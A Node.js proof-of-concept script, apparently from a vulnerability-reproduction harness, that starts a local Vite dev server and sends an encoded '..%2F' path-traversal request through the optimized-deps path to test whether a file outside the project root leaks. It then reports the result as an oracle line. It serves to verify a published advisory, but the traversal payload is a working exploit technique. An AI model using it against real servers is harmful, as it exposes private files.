const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

(async () => {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';
  let server;

  try {
    const vite = require('vite');

    const marker = 'vite-ghsa-4w7w-66w2-5vf9-' + process.pid + '-' + Date.now();
    const base = path.join(os.tmpdir(), marker);
    const root = path.join(base, 'project');
    const srcDir = path.join(root, 'src');
    const depsDir = path.join(root, 'node_modules', '.vite', 'deps');
    const outsideMap = path.join(base, 'unsafe.map');

    fs.mkdirSync(srcDir, { recursive: true });
    fs.mkdirSync(depsDir, { recursive: true });

    fs.writeFileSync(path.join(root, 'index.html'), '<!doctype html><script type="module" src="/src/main.js"></script>');
    fs.writeFileSync(path.join(srcDir, 'main.js'), 'export const ok = 1; console.log(ok);');
    fs.writeFileSync(path.join(depsDir, 'placeholder.js'), 'export default 0;');
    fs.writeFileSync(outsideMap, JSON.stringify({ version: 3, sources: [], names: [], mappings: '', marker }));

    server = await vite.createServer({
      root,
      logLevel: 'silent',
      appType: 'spa',
      server: { host: true, port: 0, fs: { strict: true } },
      optimizeDeps: { noDiscovery: true }
    });

    await server.listen();

    const benign = await server.transformRequest('/src/main.js');
    if (!benign || typeof benign.code !== 'string' || benign.code.indexOf('ok') === -1) {
      throw new Error('benign transform did not return expected code');
    }

    operation_completed = true;

    const rootPosix = root.split(path.sep).join('/');
    const encodedTraversal = '..%2F..%2F..%2Funsafe.map';
    const maliciousUrl = '/@fs/' + rootPosix + '/node_modules/.vite/deps/' + encodedTraversal;

    const response = await new Promise((resolve, reject) => {
      const chunks = [];
      let settled = false;
      const finish = (v) => {
        if (!settled) {
          settled = true;
          resolve(v);
        }
      };

      const req = { method: 'GET', url: maliciousUrl, headers: {} };
      const res = {
        statusCode: 200,
        headersSent: false,
        writableEnded: false,
        setHeader() {},
        getHeader() { return undefined; },
        removeHeader() {},
        writeHead(code) { this.statusCode = code; this.headersSent = true; return this; },
        write(chunk) {
          if (chunk != null) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(String(chunk)));
          return true;
        },
        end(chunk) {
          if (chunk != null) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(String(chunk)));
          this.writableEnded = true;
          finish({ statusCode: this.statusCode, body: Buffer.concat(chunks).toString('utf8') });
        }
      };

      try {
        server.middlewares(req, res, (err) => {
          if (err) return reject(err);
          finish({ statusCode: res.statusCode, body: Buffer.concat(chunks).toString('utf8') });
        });
      } catch (e) {
        reject(e);
      }
    });

    const body = response && typeof response.body === 'string' ? response.body : '';
    const leaked = body.indexOf(marker) !== -1;
    exploit_succeeded = leaked;
    evidence = leaked
      ? 'outside sourcemap content leaked through optimized-deps map request'
      : 'outside sourcemap marker not observed in response';
  } catch (err) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'runtime_failure: ' + (err && err.message ? err.message : String(err));
  } finally {
    if (server) {
      try {
        await server.close();
      } catch (_) {}
    }
  }

  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
})();